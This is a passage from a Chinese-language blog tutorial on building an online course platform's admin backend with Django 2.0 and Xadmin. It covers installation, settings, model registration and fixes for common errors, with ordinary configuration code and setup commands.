src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/109.png" alt="img"></p><blockquote><p>可以看到我们的表已经生成成功,命名规则为: app名称 + 我们的类名变成小写</p></blockquote><h3 id="把我们的四个app放到一个文件夹下。"><a href="#把我们的四个app放到一个文件夹下。" class="headerlink" title="把我们的四个app放到一个文件夹下。"></a>把我们的四个app放到一个文件夹下。</h3><ul><li>新建Python的package: apps</li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/110.png" alt="img"></p><ul><li>把四个app都拖进apps中去。</li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/111.png" alt="img"></p><p>去掉<code>searchfor</code>的勾选。拖进去之后会报错，说找不到那些import的模块了。</p><p>解决方案：右键<code>Mark</code>为<code>sourceRoot</code>。根目录下找不到的，会去apps下搜索。</p><p>但是这时候cmd下还是会报错。</p><p>解决方案(图来源于我的<code>DjangoGetStarted</code>教程):</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/112.png" alt="img"></p><p>同理,插入第0是希望它先搜索我们app下东西：</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/113.png" alt="img"></p><h4 id="成功性验证"><a href="#成功性验证" class="headerlink" title="成功性验证"></a>成功性验证</h4><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/114.png" alt="img"></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/115.png" alt="img"></p><blockquote><p>可以看到Django已经可以正常run成功了。</p></blockquote><h3 id="第四章总结"><a href="#第四章总结" class="headerlink" title="第四章总结"></a>第四章总结</h3><ul><li>我们设计了app</li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/116.png" alt="img"></p><ul><li>设计了user models.py</li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/117.png" alt="img"></p><ul><li>循环引用</li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/118.png" alt="img"></p><blockquote><p>得出我们需要创建一个更高层次的app。分层设计，operation在更高层。</p></blockquote><ul><li>Courses models.py</li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/119.png" alt="img"></p><ul><li>organization models.py</li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/120.png" alt="img"></p><ul><li>operation models.py</li></ul><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/121.png" alt="img"></p><p>通过makemigrations 生成表的变动 &amp; migrate<br>每个app下的migration目录的用途，和数据库中django_migration<br>将所有app放到同一个目录之下。</p><h1 id="xadmin快速搭建可用的后台系统"><a href="#xadmin快速搭建可用的后台系统" class="headerlink" title=" xadmin快速搭建可用的后台系统"></a><center> xadmin快速搭建可用的后台系统</center></h1><h2 id="django-admin介绍"><a href="#django-admin介绍" class="headerlink" title="django admin介绍"></a>django admin介绍</h2><p>上一章我们进行了需求分析和数据库设计。本章我们来快速搭建一个可用的后台管理系统。</p><p>后台管理系统特点：</p><ul><li>权限管理</li><li>少前端样式。(样式一般不是很看重)，</li><li>快速开发</li></ul><p>django的后台管理系统是一套智能的管理系统。<br>django的杀手锏之一就是admin管理系统。</p><p>admin在项目新建时就已经为我们生成好了。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/122.png" alt="img"></p><p>Django的admin也是一个app，在我们新建项目时就创建好了。<br>而且会自动在url中配置好了链接。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/123.png" alt="img"></p><p>访问:<a href="https://link.jianshu.com/?t=http://127.0.0.1:8000/admin/">http://127.0.0.1:8000/admin/</a></p><p>可以看到admin的登录窗口。</p><p>Django是不会自动生成admin的用户的，需要我们自己去命令生成。</p><h3 id="createsuperuser"><a href="#createsuperuser" class="headerlink" title="createsuperuser"></a>createsuperuser</h3><p>点击<code>Tools 菜单下 Run manage.py Task</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">createsuperuser </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入自己的用户名密码。</p><p>报错:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">django.db.utils.DataError: (1406, &quot;Data too long for column &#39;gender&#39; at row 1&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>gender中female是6位。而我们最大长度只有5.</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2a3359e969bab10a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/213" alt="img"></p><p>修改后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makemigrations users</span><br><span class="line">migrate users</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后重新<code>createsuperuser</code></p><p>使用自己定义的用户名密码可以登进系统。</p><blockquote><p>默认是用户名 + 密码。后面会讲到如何实现用户名 或 邮箱和密码登录。</p></blockquote><h3 id="修改setting中对应语言，时区，以及数据库写入时间。"><a href="#修改setting中对应语言，时区，以及数据库写入时间。" class="headerlink" title="修改setting中对应语言，时区，以及数据库写入时间。"></a>修改setting中对应语言，时区，以及数据库写入时间。</h3><p>修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 语言改为中文</span><br><span class="line">LANGUAGE_CODE &#x3D; &#39;zh-hans&#39;</span><br><span class="line"></span><br><span class="line"># 时区改为上海</span><br><span class="line">TIME_ZONE &#x3D; &#39;Asia&#x2F;Shanghai&#39;</span><br><span class="line"># 数据库存储使用时间，True时间会被存为UTC的时间</span><br><span class="line">USE_TZ &#x3D; False</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>点击运行可以看到被换成汉语的效果:</p><p>注意: django 2.0.1 并不会看到汉化后的默认页面。只有admin被汉化了。</p><p>组对应数据表: auth_group</p><p>在Django的admin中可以把上章的表都注册进来。对于表进行任意的增删改查。</p><p>默认其实会把user也注册进来的，但是因为我们通过userProfile覆盖了user。所以没有显示。</p><h3 id="注册UserProfile进来"><a href="#注册UserProfile进来" class="headerlink" title="注册UserProfile进来"></a>注册UserProfile进来</h3><p>users/admin.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line"># 因为同一个目录，所以可以直接.models</span><br><span class="line">from .models import UserProfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 写一个管理器:命名, model+Admin</span><br><span class="line">class UserProfileAdmin(admin.ModelAdmin):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 将UserProfile注册进我们的admin中, 并为它选择管理器</span><br><span class="line">admin.site.register(UserProfile,UserProfileAdmin)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/125.png" alt="img"></p><blockquote><p>可以看到我们的用户信息就注册进来了。</p></blockquote><p><code>USERS</code> 是用户所在表名称。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/126.png" alt="img"></p><p>进入页面可以看到Django为我们把每个不同类型的字段生成了不同的前端样式。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/127.png" alt="img"></p><blockquote><p>Django会自动帮我们把密码加密，而且不能反解。单向性。</p></blockquote><p>如果出现错误, 可能是<code>initial</code>文件在我们拖入apps时路径被改变。之后我们添加了环境变量, 前面再加上apps就会报错。</p><p>这时把<code>initial.py</code> 中路径进行修改。</p><p>错误2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">新增用户信息提示：</span><br><span class="line">Cannot add or update a child row: a foreign key constraint fails</span><br><span class="line">(1452, &#39;Cannot add or update a child row: a foreign key constraint fails </span><br><span class="line">&#96;mxonline&#96;.&#96;django_admin_log&#96;, CONSTRAINT &#96;django_admin_log_user_id_c564eba6_fk_auth_user_id&#96; </span><br><span class="line">FOREIGN KEY (&#96;user_id&#96;) REFERENCES &#96;auth_user&#96; (&#96;id&#96;))&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>解决方案1: 不用解决，之后换Xadmin就好了。</p></blockquote><p>解决方案2: 在setting的databases中添加以下代码取消外键检查</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DATABASES &#x3D; &#123;</span><br><span class="line">    &#39;default&#39;: &#123;</span><br><span class="line">        &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,</span><br><span class="line">        &#39;NAME&#39;: &#39;mxonline2&#39;,</span><br><span class="line">        &#39;USER&#39;: &#39;root&#39;,</span><br><span class="line">        &#39;PASSWORD&#39;: &#39;你的密码&#39;,</span><br><span class="line">        &#39;HOST&#39;:&#39;127.0.0.1&#39;,</span><br><span class="line">        &#39;OPTIONS&#39;: &#123;</span><br><span class="line">          &quot;init_command&quot;: &quot;SET foreign_key_checks&#x3D;0;&quot;,</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实验成功为了不影响后面，把options删除</p><p>本小节结束对应commit:</p><blockquote><p>admin中添加管理器&amp;注册。时区,语言,utc(False).数据库中选项参数。female的长度修改, createsuperuser.对应5-1</p></blockquote><h2 id="xadmin的安装"><a href="#xadmin的安装" class="headerlink" title="xadmin的安装"></a>xadmin的安装</h2><p>一套基于admin, 比admin更强大的系统。</p><ol><li>通过pip安装</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install xadmin</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Python3-amp-Django2-0-1安装官方适配Django2-0的包"><a href="#Python3-amp-Django2-0-1安装官方适配Django2-0的包" class="headerlink" title="Python3 &amp; Django2.0.1安装官方适配Django2.0的包"></a>Python3 &amp; Django2.0.1安装官方适配Django2.0的包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install git+git:&#x2F;&#x2F;github.com&#x2F;sshwsfc&#x2F;xadmin.git@django2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>xadmin可以把我们的后台做的很强大，可扩展。</p><h3 id="注册Xadmin-与-crispy-forms"><a href="#注册Xadmin-与-crispy-forms" class="headerlink" title="注册Xadmin 与 crispy-forms"></a>注册Xadmin 与 crispy-forms</h3><p>Mxonline2/settings.py的INSTALLED_APPS中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;xadmin&#39;,</span><br><span class="line">&#39;crispy_forms&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后把urls中默认admin指向Xadmin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 导入x admin，替换admin</span><br><span class="line">import xadmin</span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    url(r&#39;^xadmin&#x2F;&#39;, xadmin.site.urls),</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Python3 Django2.0.1 的url的配置中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">path(&#39;xadmin&#x2F;&#39;, xadmin.site.urls),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注意：Django 2.0.1中不需要加r也不需要加^</strong></p><p>将我们原来写的user/admin.py中代码注释掉。</p><p>此时直接运行项目会报错，因为我们Xadmin的默认数据表并没有migarte</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ProgrammingError: (1146, &quot;Table &#39;mxonline2.xadmin_usersettings&#39; doesn&#39;t exist&quot;)</span><br><span class="line">[09&#x2F;Jan&#x2F;2018 06:40:27] &quot;GET &#x2F;xadmin&#x2F; HTTP&#x2F;1.1&quot; 500 150414</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>点击<code>Tools 菜单下 Run manage.py Task</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makemigrations</span><br><span class="line">migrate</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前往Navicat进行验证。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-12561778ec508abe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/162" alt="img"></p><blockquote><p>可以看到新增的表。</p></blockquote><p>Xadmin的后台采用的是bootstrap。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/129.png" alt="img"></p><p>mark</p><blockquote><p>后面我们会介绍如何制作插件</p></blockquote><h3 id="源码安装："><a href="#源码安装：" class="headerlink" title="源码安装："></a>源码安装：</h3><p>github: <a href="https://link.jianshu.com/?t=https://github.com/sshwsfc/xadmin">https://github.com/sshwsfc/xadmin</a></p><p>下载或<code>git clone</code>将源码下载到本地。</p><blockquote><p>解压后将Xadmin文件夹复制到我们的项目中。</p></blockquote><h4 id="Python3版本源码安装-与url配置不同"><a href="#Python3版本源码安装-与url配置不同" class="headerlink" title="Python3版本源码安装:与url配置不同"></a>Python3版本源码安装:与url配置不同</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone -b django2 https:&#x2F;&#x2F;github.com&#x2F;sshwsfc&#x2F;xadmin.git</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其余操作一样。</p><h3 id="新建extra-apps，并在setting中注册地址"><a href="#新建extra-apps，并在setting中注册地址" class="headerlink" title="新建extra_apps，并在setting中注册地址"></a>新建extra_apps，并在setting中注册地址</h3><p>新建new package: extra_apps</p><blockquote><p>使用该目录存放我们的第三方插件，将Xadmin移入。<br>右键mark为SourceRoot, 但是这时候cmd下回报错。</p></blockquote><p>所以在setting.py中加入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.path.insert(0,os.path.join(BASE_DIR, &#39;extra_apps&#39;))</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>因为我们的source目录已经有Xadmin了，就不会再去系统环境中找了。这时候卸载我们的Xadmin。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">workon mxonline2</span><br><span class="line">pip uninstall xadmin</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是他的依赖包我们还需要，所以只需要卸载Xadmin。此时我们运行会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    from future.utils import iteritems</span><br><span class="line">ImportError: No module named future.utils</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>安装必要的包:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install future</span><br><span class="line">pip install six</span><br><span class="line">pip install httplib2</span><br><span class="line">pip install django-import-export</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时又可以成功运行了</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/131.png" alt="img"></p><p>日志记录：后台管理人员做的操作都会生成一条记录。</p><p>源码安装优点:</p><ul><li>xadmin新特性</li><li>对于源码进行自己的修改。</li></ul><p>本小节结束对应commit:</p><blockquote><p>Xadmin的安装与源码安装，配置setting中extra_apps. 对应5-2</p></blockquote><h2 id="users-app-的model注册"><a href="#users-app-的model注册" class="headerlink" title="users app 的model注册"></a>users app 的model注册</h2><h3 id="遗留问题-django2-0-1使用xadmin时。如验证码等带dateTimefield区域出错。"><a href="#遗留问题-django2-0-1使用xadmin时。如验证码等带dateTimefield区域出错。" class="headerlink" title="遗留问题: django2.0.1使用xadmin时。如验证码等带dateTimefield区域出错。"></a>遗留问题: django2.0.1使用xadmin时。如验证码等带dateTimefield区域出错。</h3><p>xadmin/widgets.py</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/132.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">input_html &#x3D; [ht for ht in super(AdminSplitDateTime, self).render(</span><br><span class="line">    name, value, attrs).split(&#39;&#x2F;&gt;&lt;&#39;) if ht !&#x3D; &#39;&#39;]</span><br><span class="line">        if (len(input_html) &gt; 1):</span><br><span class="line">            input_html[0] &#x3D; input_html[0] + &quot;&#x2F;&gt;&quot;</span><br><span class="line">            input_html[1] &#x3D; &quot;&lt;&quot; + input_html[1]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/133.png" alt="img"></p><blockquote><p>此时可以看到已经运行正常</p></blockquote><h3 id="真正开始"><a href="#真正开始" class="headerlink" title="真正开始"></a>真正开始</h3><p>Xadmin是基于Django的admin来开发的，所以Xadmin也继承了许多admin的用法。</p><ul><li>比如: models的注册。</li></ul><p>UserProfile已经被自动注册进去了，我们从验证码开始注册。</p><p>我们需要新建一个<code>adminx.py</code>文件，Xadmin会自动搜寻这种命名的文件。</p><h3 id="新建py文件的初始化模板"><a href="#新建py文件的初始化模板" class="headerlink" title="新建py文件的初始化模板"></a>新建py文件的初始化模板</h3><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/134.png"></p><p>新建users/adminx.py：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">import xadmin</span><br><span class="line"></span><br><span class="line">from .models import EmailVerifyRecord</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 创建admin的管理类,这里不再是继承admin，而是继承object</span><br><span class="line">class EmailVerifyRecordAdmin(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xadmin.site.register(EmailVerifyRecord, EmailVerifyRecordAdmin)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/135.png" alt="img"></p><blockquote><p>可以看到这时候访问已经有邮箱验证码了。</p></blockquote><p>邮箱验证码这几个字就是我们代码中Meta中verbose_name定义的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Meta:</span><br><span class="line">    verbose_name &#x3D; &quot;邮箱验证码&quot;</span><br><span class="line">    verbose_name_plural &#x3D; verbose_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>verbose_name_plural</code>是<code>verbose_name</code>的复数形式。</p><p>字段的verbose_name会直接显示在后台。<code>sendtype</code>和<code>sendtime</code>没有设置所以直接显示了英文。</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/136.png" alt="img"></p><blockquote><p>可以看到我们添加验证码成功。注意:上节版本中我们进行了: makemigaration &amp; migrate。<br>但是它是pip安装的Xadmin的数据表生成。我们卸载之后，源码安装需要重新运行进行数据迁移。(django需要通过app文件夹下的init文件来记录表的更改记录，pip的都卸了，所以就没法找到了)</p></blockquote><p>会报错:</p><blockquote><p>Xadmin_log不存在错误。只需要运行这两条命令即可。</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/137.png" alt="img"></p><h4 id="解决后台部分英文显示"><a href="#解决后台部分英文显示" class="headerlink" title="解决后台部分英文显示"></a>解决后台部分英文显示</h4><blockquote><p>全部models中字段自行添加verbose_name</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/138.png" alt="img"></p><p>这里就不贴出来了，自行检查都加上(没写出的请自行修改全部加上verbose_name)。</p><h4 id="解决EmailVerifyRecord-object显示"><a href="#解决EmailVerifyRecord-object显示" class="headerlink" title="解决EmailVerifyRecord object显示"></a>解决EmailVerifyRecord object显示</h4><blockquote><p><strong>全部</strong>(没写出的请自行修改)model，py2:重载<code>__unicode</code> py3:重载<code>__str__</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 重载Unicode方法使后台不再直接显示object</span><br><span class="line">def __unicode__(self):</span><br><span class="line">    return &#39;&#123;0&#125;(&#123;1&#125;)&#39;.format(self.code,self.email)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>上面代码是python的自身基础语法。</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/139.png" alt="img"></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/140.png" alt="img"></p><h4 id="配置显示列"><a href="#配置显示列" class="headerlink" title="配置显示列"></a>配置显示列</h4><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/141.png" alt="img"></p><p>users/adminx.py的管理器中设置list_display:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 创建admin的管理类,这里不再是继承admin，而是继承object</span><br><span class="line">class EmailVerifyRecordAdmin(object):</span><br><span class="line">    # 配置后台我们需要显示的列</span><br><span class="line">    list_display &#x3D; [&#39;code&#39;, &#39;email&#39;,&#39;send_type&#39;, &#39;send_time&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>list_display可以使用列表或元祖，建议使用列表。否则元组只有一个元素，忘记加逗号就会报错。</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/142.png" alt="img"></p><p>选择框的生成是因为我们加上了<code>choices</code></p><h4 id="配置搜索searchfield"><a href="#配置搜索searchfield" class="headerlink" title="配置搜索searchfield"></a>配置搜索searchfield</h4><p>users/adminx.py的管理器中EmailVerifyRecordAdmin添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 配置搜索字段,不做时间搜索</span><br><span class="line">search_fields &#x3D;  [&#39;code&#39;, &#39;email&#39;,&#39;send_type&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/143.png" alt="img"></p><p>再添加一条数据验证搜索功能</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/144.png" alt="img"></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/145.png" alt="img"></p><h4 id="xadmin导出csv中文乱码解决"><a href="#xadmin导出csv中文乱码解决" class="headerlink" title="xadmin导出csv中文乱码解决"></a>xadmin导出csv中文乱码解决</h4><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/146.png" alt="img"></p><blockquote><p>set=utf-8<code> 改为</code>charset=gbk`</p></blockquote><h4 id="xadmin导出xml报错"><a href="#xadmin导出xml报错" class="headerlink" title="xadmin导出xml报错"></a>xadmin导出xml报错</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TypeError at &#x2F;xadmin&#x2F;users&#x2F;emailverifyrecord&#x2F;</span><br><span class="line">unicode argument expected, got &#39;str&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>io.StringIO这个库新版本的python3直接往这个库中加入了一些新的内容，使得该库在Python2.7中较为混乱。</p></blockquote><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/147.png" alt="img"></p><blockquote><p>将StringIo变为BytesIO</p></blockquote><h4 id="通过时间筛选字段。"><a href="#通过时间筛选字段。" class="headerlink" 